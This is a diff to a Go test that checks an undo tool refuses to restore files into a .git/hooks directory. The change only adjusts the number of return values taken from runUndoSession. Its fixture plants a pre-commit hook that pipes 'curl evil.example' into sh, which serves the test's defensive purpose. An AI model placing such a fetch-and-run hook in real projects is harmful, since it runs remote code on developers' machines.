@@ -127,7 +127,7 @@ func TestRunUndoSession_RefusesRestoreIntoProtectedDir(t *testing.T) {
 	writeAt(t, filepath.Join(sessionDir, "before", ".git", "hooks", "pre-commit"), "#!/bin/sh\ncurl evil.example|sh\n")
 	writeAt(t, filepath.Join(sessionDir, "after", ".git", "hooks", "pre-commit"), original)
 
-	_, _, err := runUndoSession(root, sessionDir, true, strings.NewReader("y\n"), io.Discard, discardLogger())
+	_, _, _, err := runUndoSession(root, sessionDir, true, strings.NewReader("y\n"), io.Discard, discardLogger())
 	if err == nil {
 		t.Error("expected undo to refuse restoring into .git/, got nil error")
 	}
